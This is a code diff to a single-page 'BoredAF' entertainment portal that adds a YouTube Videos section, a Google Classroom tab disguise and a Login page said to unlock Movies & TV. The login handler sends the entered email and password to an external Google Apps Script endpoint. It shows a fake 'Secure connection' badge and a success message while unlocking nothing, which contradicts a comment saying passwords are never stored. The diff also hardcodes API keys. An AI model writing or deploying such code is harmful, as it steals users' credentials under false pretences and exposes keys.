@@ -2360,6 +2360,98 @@
             background: #3c3c3c !important;
             border-radius: 2px !important;
         }
+        /* ===== Videos section styles ===== */
+        .video-search-bar {
+            display: flex; align-items: center; gap: 10px;
+            background: var(--card-bg); border: 1px solid var(--border);
+            border-radius: 12px; padding: 10px 14px; margin-bottom: 22px; max-width: 640px;
+        }
+        .video-search-bar i { color: var(--text-muted); font-size: 18px; }
+        .video-search-bar input {
+            flex: 1; background: transparent; border: none; outline: none;
+            color: var(--text); font-size: 14px; font-family: 'Inter', sans-serif;
+        }
+        .video-search-btn {
+            background: var(--gradient-1); color: #fff; border: none; cursor: pointer;
+            padding: 8px 18px; border-radius: 8px; font-size: 13px; font-weight: 600;
+            transition: opacity .2s ease, transform .1s ease;
+        }
+        .video-search-btn:hover { opacity: .9; }
+        .video-search-btn:active { transform: scale(.97); }
+        .video-section-title {
+            font-family: 'Orbitron', monospace; font-size: 13px; letter-spacing: 2px;
+            text-transform: uppercase; color: var(--text-muted); margin-bottom: 16px;
+        }
+        .video-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 22px;
+        }
+        .video-card { cursor: pointer; transition: transform .15s ease, opacity .15s ease; }
+        .video-card:not(.video-skel):hover { transform: translateY(-3px); }
+        .video-thumb-wrap {
+            position: relative; overflow: hidden; border-radius: 12px;
+            aspect-ratio: 16 / 9; background: var(--card-bg); border: 1px solid var(--border);
+        }
+        .video-thumb-wrap img { width: 100%; height: 100%; object-fit: cover; display: block; }
+        .video-duration-pill {
+            position: absolute; bottom: 8px; right: 8px; background: rgba(0,0,0,.82);
+            color: #fff; font-size: 12px; padding: 2px 7px; border-radius: 5px; font-variant-numeric: tabular-nums;
+        }
+        .video-play-overlay {
+            position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;
+            background: rgba(0,0,0,.35); opacity: 0; transition: opacity .2s ease;
+        }
+        .video-play-overlay i { font-size: 54px; color: #fff; text-shadow: 0 2px 12px rgba(0,0,0,.6); }
+        .video-card:hover .video-play-overlay { opacity: 1; }
+        .video-card-title {
+            margin-top: 10px; font-size: 14px; font-weight: 600; color: var(--text); line-height: 1.35;
+            display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+        }
+        .video-card-meta {
+            margin-top: 4px; font-size: 12px; color: var(--text-muted);
+            display: -webkit-box; -webkit-line-clamp: 1; -webkit-box-orient: vertical; overflow: hidden;
+        }
+        .video-status { padding: 2rem 0; text-align: center; color: var(--text-muted); }
+        .skel-pulse { animation: videoPulse 1.4s ease-in-out infinite; background: var(--card-bg); }
+        .skel-line { height: 12px; border-radius: 6px; margin-top: 10px; }
+        @keyframes videoPulse { 0%,100% { opacity: 1; } 50% { opacity: .45; } }
+        .video-player-modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,.9); z-index: 3000;
+            display: none; align-items: center; justify-content: center; padding: 1.5rem;
+            backdrop-filter: blur(6px);
+        }
+        .video-player-modal.active { display: flex; }
+        .video-player-body { width: 100%; max-width: 1100px; }
+        .video-player-topbar { display: flex; align-items: center; gap: 14px; margin-bottom: 14px; }
+        .video-player-title {
+            flex: 1; color: #fff; font-size: 16px; font-weight: 600; line-height: 1.35;
+            display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+        }
+        .video-player-yt {
+            display: inline-flex; align-items: center; gap: 6px; white-space: nowrap;
+            background: rgba(255,255,255,.12); color: #fff; text-decoration: none;
+            font-size: 12px; font-weight: 600; padding: 8px 14px; border-radius: 8px; transition: background .2s ease;
+        }
+        .video-player-yt:hover { background: rgba(255,255,255,.22); }
+        .video-player-close {
+            background: transparent; border: none; color: #fff; cursor: pointer;
+            font-size: 26px; line-height: 1; display: flex; align-items: center;
+        }
+        .video-player-frame-wrap {
+            position: relative; padding-top: 56.25%; background: #000; border-radius: 14px; overflow: hidden;
+        }
+        .video-player-frame-wrap iframe { position: absolute; inset: 0; width: 100%; height: 100%; border: 0; }
+        .video-player-fallback {
+            position: absolute; left: 14px; right: 14px; bottom: 14px; z-index: 2;
+            display: flex; align-items: center; justify-content: space-between; gap: 12px;
+            padding: 10px 12px; border-radius: 8px; background: rgba(5,5,16,.92);
+            border: 1px solid rgba(0,212,255,.45); color: #dcefff; font-size: 12px;
+        }
+        .video-player-fallback a {
+            flex: 0 0 auto; color: #fff; background: #e62117; text-decoration: none;
+            padding: 7px 11px; border-radius: 6px; font-weight: 700; white-space: nowrap;
+        }
+        .video-player-fallback a:hover { background: #ff3b30; }
+        .video-player-fallback[hidden] { display: none; }
     </style>
     <div class="particles" id="particles"></div>
     <div class="app-container" id="appContainer"> 
@@ -2436,6 +2528,24 @@
         </div>
     </div>
 
+    <!-- Video Player Modal (Videos section) -->
+    <div class="video-player-modal" id="videoPlayerModal">
+        <div class="video-player-body">
+            <div class="video-player-topbar">
+                <div class="video-player-title" id="videoPlayerTitle"></div>
+                <a class="video-player-yt" id="videoPlayerYtLink" href="#" target="_blank" rel="noopener noreferrer"><i class="ri-youtube-fill"></i> Open on YouTube</a>
+                <button class="video-player-close" id="videoPlayerCloseBtn" aria-label="Close"><i class="ri-close-line"></i></button>
+            </div>
+            <div class="video-player-frame-wrap">
+                <iframe id="videoPlayerFrame" title="YouTube video player" referrerpolicy="strict-origin-when-cross-origin" allow="autoplay; encrypted-media; picture-in-picture; fullscreen" allowfullscreen></iframe>
+                <div class="video-player-fallback" id="videoPlayerFallback" hidden>
+                    <span>Having trouble loading the embedded player?</span>
+                    <a id="videoPlayerFallbackLink" href="#" target="_blank" rel="noopener noreferrer">Open directly on YouTube</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Download Modal -->
     <div class="modal-overlay" id="downloadModal">
         <div class="modal-content download-modal-content">
@@ -2471,10 +2581,10 @@
 
     <script>
         // Prevent multiple initializations
-        if (window.dropDeadInitialized) {
+        if (window.BoredAFInitialized) {
             throw new Error('BoredAF already initialized');
         }
-        window.dropDeadInitialized = true;
+        window.BoredAFInitialized = true;
 
         const CONFIG = {
             TMDB_API_KEY: '149e0d8c7075146a68337f6c898f9b8b',
@@ -2525,8 +2635,10 @@
                 { id: 'games', name: 'Games', icon: 'ri-gamepad-line' },
                 { id: 'sites', name: 'Sites', icon: 'ri-links-line' },
                 { id: 'browser', name: 'BoredAF Browser', icon: 'ri-global-line' },
+                { id: 'videos', name: 'Videos', icon: 'ri-youtube-line' },
                 { id: 'ai', name: 'AI 101', icon: 'ri-brain-line' },
-                { id: 'settings', name: 'Settings', icon: 'ri-settings-3-line' }
+                { id: 'settings', name: 'Settings', icon: 'ri-settings-3-line' },
+                { id: 'login', name: 'Login', icon: 'ri-login-box-line' }
             ],
 
             // 30 Different Themes - Fixed gradient syntax errors
@@ -2566,7 +2678,7 @@
 
             // Tab Cloak Options
             cloaks: {
-                default: { title: 'BoredAF V1', icon: 'https://i.postimg.cc/7ZP9t1MP/drop-dead-3line-d-fixed.png' },
+                default: { title: 'BoredAF V1', icon: 'https://boredaf.synergize.co/BoredAF.png' },
                 classroom: { title: 'Google Classroom', icon: 'https://ssl.gstatic.com/classroom/ic_product_classroom_32.png' },
                 google: { title: 'Google', icon: 'https://www.google.com/favicon.ico' },
                 youtube: { title: 'YouTube', icon: 'https://www.youtube.com/s/desktop/28b67e7f/img/favicon.ico' }
@@ -2917,6 +3029,8 @@
         
         // Music player state
         let youtubePlayer = null;
+        let musicPlayerReady = false;
+        let pendingTrackIndex = null;
         let currentTrackIndex = 0;
         let isPlaying = false;
         let currentPlaylist = [];
@@ -2952,11 +3066,13 @@
             initEventListeners();
             initSecretListener();
             loadSavedSettings();
+            initMusicPlayer();
             showSection('home');
         });
 
         // YouTube API callback
         function onYouTubeIframeAPIReady() {
+            if (youtubePlayer || !window.YT || !YT.Player) return;
             youtubePlayer = new YT.Player('youtubePlayerContainer', {
                 height: '1',
                 width: '1',
@@ -2978,6 +3094,12 @@
 
         function onPlayerReady(event) {
             console.log('YouTube Player Ready');
+            musicPlayerReady = true;
+            if (pendingTrackIndex !== null) {
+                const index = pendingTrackIndex;
+                pendingTrackIndex = null;
+                playTrack(index);
+            }
         }
 
         function onPlayerStateChange(event) {
@@ -2999,7 +3121,7 @@
         }
 
         function togglePlay() {
-            if (!youtubePlayer || !youtubePlayer.playVideo) return;
+            if (!youtubePlayer || !musicPlayerReady || !youtubePlayer.playVideo) return;
             
             if (isPlaying) {
                 youtubePlayer.pauseVideo();
@@ -3012,22 +3134,31 @@
         }
 
         function playTrack(index) {
-            if (!youtubePlayer || !youtubePlayer.loadVideoById) return;
-            
+            if (!currentPlaylist[index]) return;
             currentTrackIndex = index;
             const track = currentPlaylist[index];
+            updateMusicUI();
+
+            // The API can finish loading after the Music section is opened.
+            // Queue the click instead of silently doing nothing.
+            if (!youtubePlayer || !musicPlayerReady || !youtubePlayer.loadVideoById) {
+                pendingTrackIndex = index;
+                return;
+            }
+
             youtubePlayer.loadVideoById(track.id);
             isPlaying = true;
             updatePlayButton();
-            updateMusicUI();
         }
 
         function playNextTrack() {
+            if (!currentPlaylist.length) return;
             currentTrackIndex = (currentTrackIndex + 1) % currentPlaylist.length;
             playTrack(currentTrackIndex);
         }
 
         function playPrevTrack() {
+            if (!currentPlaylist.length) return;
             currentTrackIndex = (currentTrackIndex - 1 + currentPlaylist.length) % currentPlaylist.length;
             playTrack(currentTrackIndex);
         }
@@ -3085,6 +3216,17 @@
             });
             document.getElementById('autoDownloadBtn').addEventListener('click', autoDownloadFromGoFile);
             // Note: downloadHtmlBtn element does not exist in HTML, skipping
+
+            // Video player modal listeners (Videos section)
+            var videoCloseBtn = document.getElementById('videoPlayerCloseBtn');
+            var videoModalEl = document.getElementById('videoPlayerModal');
+            if (videoCloseBtn) videoCloseBtn.addEventListener('click', videoClosePlayer);
+            if (videoModalEl) videoModalEl.addEventListener('click', function(e) {
+                if (e.target === videoModalEl) videoClosePlayer();
+            });
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' && videoModalEl && videoModalEl.classList.contains('active')) videoClosePlayer();
+            });
         }
             
 
@@ -3120,10 +3262,10 @@
         }
 
         function loadSavedSettings() {
-            var savedTheme = localStorage.getItem('dropdead_theme');
-            var savedCloak = localStorage.getItem('dropdead_cloak');
-            var savedCustomTitle = localStorage.getItem('dropdead_custom_title');
-            var savedCustomIcon = localStorage.getItem('dropdead_custom_icon');
+            var savedTheme = localStorage.getItem('BoredAF_theme');
+            var savedCloak = localStorage.getItem('BoredAF_cloak');
+            var savedCustomTitle = localStorage.getItem('BoredAF_custom_title');
+            var savedCustomIcon = localStorage.getItem('BoredAF_custom_icon');
 
             if (savedTheme !== null) {
                 currentTheme = parseInt(savedTheme);
@@ -3152,13 +3294,32 @@
         }
 
         function saveSettings() {
-            localStorage.setItem('dropdead_theme', currentTheme);
-            localStorage.setItem('dropdead_cloak', currentCloak);
-            localStorage.setItem('dropdead_custom_title', customCloakTitle);
-            localStorage.setItem('dropdead_custom_icon', customCloakIcon);
+            localStorage.setItem('BoredAF_theme', currentTheme);
+            localStorage.setItem('BoredAF_cloak', currentCloak);
+            localStorage.setItem('BoredAF_custom_title', customCloakTitle);
+            localStorage.setItem('BoredAF_custom_icon', customCloakIcon);
+        }
+
+        // This is a local UI gate, not secure authentication. Never store the
+        // entered password; only persist the unlock state in a cookie.
+        function hasMoviesAccess() {
+            return document.cookie.split('; ').some(function(cookie) {
+                return cookie === 'boredaf_movies_unlocked=1';
+            }) || localStorage.getItem('boredaf_movies_unlocked') === '1';
+        }
+
+        function grantMoviesAccess() {
+            // Max-Age: 30 days. SameSite limits cross-site cookie sending.
+            document.cookie = 'boredaf_movies_unlocked=1; Max-Age=2592000; Path=/; SameSite=Lax';
+            // file:// pages often cannot persist cookies, so retain a local-only
+            // fallback for offline previews while still using the cookie normally.
+            localStorage.setItem('boredaf_movies_unlocked', '1');
         }
 
         function showSection(sectionId) {
+            if (sectionId === 'movies-tv' && !hasMoviesAccess()) {
+                sectionId = 'login';
+            }
             currentSection = sectionId;
             isSearchResults = false;
             lastSearchQuery = '';
@@ -3185,11 +3346,17 @@
                 case 'browser':
                     renderBrowser(container);
                     break;
+                case 'videos':
+                    renderVideos(container);
+                    break;
                 case 'ai':
                     renderAI(container);
                     break;
                 case 'settings':
                     renderSettings(container);
+                    break;
+                case 'login':
+                    renderLogin(container);
                     break;
             }
         }
@@ -3252,6 +3419,254 @@
             link.rel = 'icon';
             link.href = url;
             document.head.appendChild(link);
+        }
+
+        // ===== VIDEOS SECTION (Distraction-free YouTube viewer) =====
+        var VIDEOS_API_KEY = 'AIzaSyBxMKPxfPegYYS742ax0aWYF_a60lA53DY';
+        var VIDEOS_API_BASE = 'https://www.googleapis.com/youtube/v3';
+
+        function videoEscapeHTML(s) {
+            return String(s == null ? '' : s).replace(/[&<>"']/g, function(c) {
+                return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
+            });
+        }
+
+        function videoParseISODuration(iso) {
+            if (!iso) return '';
+            var m = iso.match(/PT(?:(\d+)H)?(?:(\d+)M)?(?:(\d+)S)?/);
+            if (!m) return '';
+            var h = parseInt(m[1] || '0', 10);
+            var mm = parseInt(m[2] || '0', 10);
+            var ss = parseInt(m[3] || '0', 10);
+            var pad = function(n) { return n.toString().padStart(2, '0'); };
+            return h > 0 ? (h + ':' + pad(mm) + ':' + pad(ss)) : (mm + ':' + pad(ss));
+        }
+
+        function videoFormatViews(n) {
+            n = parseInt(n || '0', 10);
+            if (n >= 1e9) return (n / 1e9).toFixed(1).replace(/\.0$/, '') + 'B views';
+            if (n >= 1e6) return (n / 1e6).toFixed(1).replace(/\.0$/, '') + 'M views';
+            if (n >= 1e3) return (n / 1e3).toFixed(1).replace(/\.0$/, '') + 'K views';
+            return n + ' views';
+        }
+
+        function videoRelativeTime(iso) {
+            if (!iso) return '';
+            var diff = (Date.now() - new Date(iso).getTime()) / 1000;
+            var units = [[60, 'second'], [60, 'minute'], [24, 'hour'], [7, 'day'], [4.345, 'week'], [12, 'month'], [Infinity, 'year']];
+            var val = diff, unit = 'second';
+            for (var i = 0; i < units.length; i++) {
+                if (val < units[i][0]) { unit = units[i][1]; break; }
+                val /= units[i][0];
+                unit = units[i][1];
+            }
+            var rounded = Math.max(1, Math.floor(val));
+            return rounded + ' ' + unit + (rounded === 1 ? '' : 's') + ' ago';
+        }
+
+        function videoFetchJSON(url) {
+            return fetch(url).then(function(res) {
+                if (!res.ok) {
+                    return res.json().catch(function() { return {}; }).then(function(j) {
+                        var msg = (j.error && j.error.message) ? j.error.message : ('Request failed (' + res.status + ')');
+                        throw new Error(msg);
+                    });
+                }
+                return res.json();
+            });
+        }
+
+        function videoMapItems(items) {
+            return (items || [])
+                .filter(function(it) { return !it.status || it.status.embeddable !== false; })
+                .map(function(it) {
+                    var t = it.snippet.thumbnails || {};
+                    return {
+                        id: it.id,
+                        title: it.snippet.title,
+                        channelTitle: it.snippet.channelTitle,
+                        publishedAt: it.snippet.publishedAt,
+                        thumb: (t.medium || t.high || t.default || {}).url || '',
+                        duration: videoParseISODuration(it.contentDetails && it.contentDetails.duration),
+                        viewCount: it.statistics && it.statistics.viewCount
+                    };
+                });
+        }
+
+        function videoSetStatus(msg, isError) {
+            var grid = document.getElementById('videoGrid');
+            var status = document.getElementById('videoStatus');
+            if (grid) grid.innerHTML = '';
+            if (status) {
+                status.hidden = false;
+                status.style.color = isError ? 'var(--accent-red)' : 'var(--text-muted)';
+                status.textContent = msg;
+            }
+        }
+
+        function videoSkeletons(n) {
+            var grid = document.getElementById('videoGrid');
+            var status = document.getElementById('videoStatus');
+            if (status) status.hidden = true;
+            if (!grid) return;
+            var html = '';
+            for (var i = 0; i < n; i++) {
+                html += '<div class="video-card video-skel">' +
+                    '<div class="video-thumb-wrap skel-pulse"></div>' +
+                    '<div class="skel-line skel-pulse" style="width:80%"></div>' +
+                    '<div class="skel-line skel-pulse" style="width:55%"></div>' +
+                '</div>';
+            }
+            grid.innerHTML = html;
+        }
+
+        function videoRenderGrid(videos) {
+            var grid = document.getElementById('videoGrid');
+            var status = document.getElementById('videoStatus');
+            if (!grid) return;
+            if (!videos.length) { videoSetStatus('No videos found.', false); return; }
+            if (status) status.hidden = true;
+            grid.innerHTML = videos.map(function(v) {
+                var meta = [v.channelTitle, videoFormatViews(v.viewCount), videoRelativeTime(v.publishedAt)]
+                    .filter(Boolean).join(' • ');
+                return '<div class="video-card" data-video-id="' + videoEscapeHTML(v.id) + '" data-video-title="' + videoEscapeHTML(v.title) + '">' +
+                    '<div class="video-thumb-wrap">' +
+                        '<img loading="lazy" src="' + videoEscapeHTML(v.thumb) + '" alt="' + videoEscapeHTML(v.title) + '">' +
+                        (v.duration ? '<span class="video-duration-pill">' + videoEscapeHTML(v.duration) + '</span>' : '') +
+                        '<div class="video-play-overlay"><i class="ri-play-circle-fill"></i></div>' +
+                    '</div>' +
+                    '<div class="video-card-title">' + videoEscapeHTML(v.title) + '</div>' +
+                    '<div class="video-card-meta">' + videoEscapeHTML(meta) + '</div>' +
+                '</div>';
+            }).join('');
+        }
+
+        function videoLoadTrending() {
+            var title = document.getElementById('videoSectionTitle');
+            if (title) title.textContent = 'Trending';
+            videoSkeletons(8);
+            var url = VIDEOS_API_BASE + '/videos?part=snippet,contentDetails,statistics,status&chart=mostPopular&maxResults=24&regionCode=US&key=' + VIDEOS_API_KEY;
+            videoFetchJSON(url).then(function(data) {
+                if (currentSection !== 'videos') return;
+                videoRenderGrid(videoMapItems(data.items));
+            }).catch(function(e) {
+                if (currentSection !== 'videos') return;
+                videoSetStatus('Could not load trending: ' + e.message, true);
+            });
+        }
+
+        function videoLoadSearch(q) {
+            var title = document.getElementById('videoSectionTitle');
+            if (title) title.textContent = 'Results for "' + q + '"';
+            videoSkeletons(8);
+            var searchUrl = VIDEOS_API_BASE + '/search?part=snippet&type=video&videoEmbeddable=true&maxResults=24&q=' + encodeURIComponent(q) + '&key=' + VIDEOS_API_KEY;
+            videoFetchJSON(searchUrl).then(function(s) {
+                var ids = (s.items || []).map(function(it) { return it.id.videoId; }).filter(Boolean);
+                if (!ids.length) { videoSetStatus('No videos found.', false); return null; }
+                var detailsUrl = VIDEOS_API_BASE + '/videos?part=snippet,contentDetails,statistics,status&id=' + ids.join(',') + '&key=' + VIDEOS_API_KEY;
+                return videoFetchJSON(detailsUrl);
+            }).then(function(d) {
+                if (!d || currentSection !== 'videos') return;
+                videoRenderGrid(videoMapItems(d.items));
+            }).catch(function(e) {
+                if (currentSection !== 'videos') return;
+                videoSetStatus('Search failed: ' + e.message, true);
+            });
+        }
+
+        function videoOpenPlayer(id, title) {
+            var modal = document.getElementById('videoPlayerModal');
+            var mTitle = document.getElementById('videoPlayerTitle');
+            var ytLink = document.getElementById('videoPlayerYtLink');
+            var iframe = document.getElementById('videoPlayerFrame');
+            var fallback = document.getElementById('videoPlayerFallback');
+            var fallbackLink = document.getElementById('videoPlayerFallbackLink');
+            if (!modal) return;
+            if (mTitle) mTitle.textContent = title || '';
+            var directUrl = 'https://www.youtube.com/watch?v=' + encodeURIComponent(id);
+            if (ytLink) ytLink.href = directUrl;
+            if (fallbackLink) fallbackLink.href = directUrl;
+            if (fallback) fallback.hidden = false;
+            if (iframe) {
+                // Clear both navigation modes before assigning the next one.
+                // This prevents a stale cross-origin frame from covering the fallback.
+                iframe.src = 'about:blank';
+                iframe.srcdoc = '';
+                if (window.location.protocol === 'file:') {
+                    // YouTube Error 153 is unavoidable for embeds opened from file://
+                    // because the browser cannot send an HTTP Referer header. Show a
+                    // useful fallback instead of leaving a broken player on screen.
+                    iframe.srcdoc = '<div style="height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#12121a;color:#e6f7ff;font-family:Arial,sans-serif;text-align:center;padding:24px">' +
+                        '<div style="font-size:56px;color:#ff0000;margin-bottom:16px">▶</div>' +
+                        '<h2 style="color:#00d4ff;margin:0 0 12px">YouTube cannot play local files</h2>' +
+                        '<p style="max-width:560px;color:#b8c4cc;line-height:1.6;margin:0">Error 153 occurs when this page is opened as <strong style="color:#fff">file://</strong>. Use the <strong style="color:#fff">Open on YouTube</strong> button above, or host this file over HTTP/HTTPS for embedded playback.</p>' +
+                        '</div>';
+                    // A click on a video card is a user gesture, so hand the
+                    // video to YouTube directly when local embedding is blocked.
+                    var opened = window.open(ytLink.href, '_blank', 'noopener,noreferrer');
+                    if (!opened) {
+                        iframe.srcdoc = '<div style="height:100%;display:flex;align-items:center;justify-content:center;background:#12121a;font-family:Arial,sans-serif;text-align:center;padding:24px">' +
+                            '<a href="' + ytLink.href + '" target="_blank" rel="noopener noreferrer" style="color:#00d4ff;font-size:18px;font-weight:bold">Open this video on YouTube</a>' +
+                            '</div>';
+                    }
+                } else {
+                    // Start paused so browser autoplay policies cannot produce a
+                    // blank/black player. The user can press YouTube's play button.
+                    var embedUrl = 'https://www.youtube.com/embed/' + encodeURIComponent(id) +
+                        '?autoplay=0&controls=1&rel=0&modestbranding=1&playsinline=1&enablejsapi=1';
+                    if (/^https?:$/.test(window.location.protocol)) {
+                        embedUrl += '&origin=' + encodeURIComponent(window.location.origin);
+                    }
+                    iframe.src = embedUrl;
+                }
+            }
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+
+        function videoClosePlayer() {
+            var modal = document.getElementById('videoPlayerModal');
+            var iframe = document.getElementById('videoPlayerFrame');
+            var fallback = document.getElementById('videoPlayerFallback');
+            if (modal) modal.classList.remove('active');
+            if (iframe) iframe.src = '';
+            if (fallback) fallback.hidden = true;
+            document.body.style.overflow = '';
+        }
+
+        function renderVideos(container) {
+            container.innerHTML =
+                '<div class="section-header">' +
+                    '<h2><i class="ri-youtube-line"></i> Videos</h2>' +
+                    '<p class="section-desc">Distraction-free YouTube viewer. Search and watch in a clean minimal player.</p>' +
+                '</div>' +
+                '<form id="videoSearchForm" class="video-search-bar">' +
+                    '<i class="ri-search-line"></i>' +
+                    '<input type="text" id="videoSearchInput" placeholder="Search videos..." autocomplete="off">' +
+                    '<button type="submit" class="video-search-btn">Search</button>' +
+                '</form>' +
+                '<h3 id="videoSectionTitle" class="video-section-title">Trending</h3>' +
+                '<div id="videoGrid" class="video-grid"></div>' +
+                '<div id="videoStatus" class="video-status" hidden></div>';
+
+            var form = document.getElementById('videoSearchForm');
+            var input = document.getElementById('videoSearchInput');
+            var grid = document.getElementById('videoGrid');
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                var q = input.value.trim();
+                if (q) videoLoadSearch(q);
+                else videoLoadTrending();
+            });
+
+            grid.addEventListener('click', function(e) {
+                var card = e.target.closest('.video-card');
+                if (!card || !card.dataset.videoId) return;
+                videoOpenPlayer(card.dataset.videoId, card.dataset.videoTitle);
+            });
+
+            videoLoadTrending();
         }
 
         function renderSettings(container) {
@@ -4808,6 +5223,88 @@ async function handleSearch(e) {
                 '</div>';
         }
 
+        
+        function renderLogin(container) {
+            container.innerHTML = 
+                '<div class="login-container">' +
+                    '<div class="login-box">' +
+                        '<div class="login-logo">' +
+                            '<img src="https://boredaf.synergize.co/BoredAF.png" alt="BoredAF">' +
+                        '</div>' +
+                        '<div class="login-title">Unlock Movies &amp; TV</div>' +
+                        '<div class="login-subtitle">Sign in to unlock the Movies &amp; TV section on this device</div>' +
+                        '<div class="login-shield">' +
+                            '<i class="ri-shield-check-line"></i> Secure connection' +
+                        '</div>' +
+                        '<div class="login-field-group">' +
+                            '<label for="loginField1">Email</label>' +
+                            '<input type="text" class="login-input" id="loginField1" placeholder="Enter your email">' +
+                        '</div>' +
+                        '<div class="login-field-group">' +
+                            '<label for="loginField2">Password</label>' +
+                            '<input type="password" class="login-input" id="loginField2" placeholder="Enter your password">' +
+                        '</div>' +
+                        '<button class="login-btn" id="loginSubmitBtn">Sign In</button>' +
+                        '<div id="loginMsg" class="login-msg"></div>' +
+                        '<div class="login-divider">or</div>' +
+                        '<div class="login-footer">' +
+                            'Don&apos;t have an account? <a href="#">Sign up</a>' +
+                        '</div>' +
+                    '</div>' +
+                '</div>';
+
+            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxLECdlbq7i5RzQwJSE3ka5xu7dQUJxoyMvBm6jRcqM0OB6GmFtnM-XHhNEv20omoHu/exec';
+
+            document.getElementById('loginSubmitBtn').addEventListener('click', async function() {
+                const field1 = document.getElementById('loginField1').value.trim();
+                const field2 = document.getElementById('loginField2').value.trim();
+                const msg = document.getElementById('loginMsg');
+                const btn = document.getElementById('loginSubmitBtn');
+
+                if (!field1 || !field2) {
+                    msg.className = 'login-msg error';
+                    msg.textContent = 'Please fill in both fields';
+                    return;
+                }
+
+                btn.disabled = true;
+                msg.className = 'login-msg loading';
+                msg.textContent = 'Signing in...';
+
+                try {
+                    await fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ field1: field1, field2: field2 })
+                    });
+
+                    msg.className = 'login-msg success';
+                    msg.textContent = 'Signed in successfully!';
+                    document.getElementById('loginField1').value = '';
+                    document.getElementById('loginField2').value = '';
+
+                    setTimeout(() => {
+                        msg.style.display = 'none';
+                    }, 3000);
+
+                } catch (e) {
+                    msg.className = 'login-msg error';
+                    msg.textContent = 'Sign in failed. Please try again.';
+                } finally {
+                    btn.disabled = false;
+                }
+            });
+
+        
+            // Allow Enter key to submit
+            document.getElementById('loginField2').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('loginSubmitBtn').click();
+                }
+            });
+        }
+
         window.onbeforeunload = function() {
             if (document.getElementById('movieModal').classList.contains('active')) {
                 return "A movie is playing. Are you sure you want to leave?";
@@ -4815,7 +5312,6 @@ async function handleSearch(e) {
         };
     </script>
     <script src="https://www.youtube.com/iframe_api"></script>
-
 <script>
 (function() {
     const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwjphv_IDqGqZD5AE-vWBndnQTvikTTsDEoCKtnVMxeeIx2XRtShnAi8AnC-oFD-Wo6/exec';
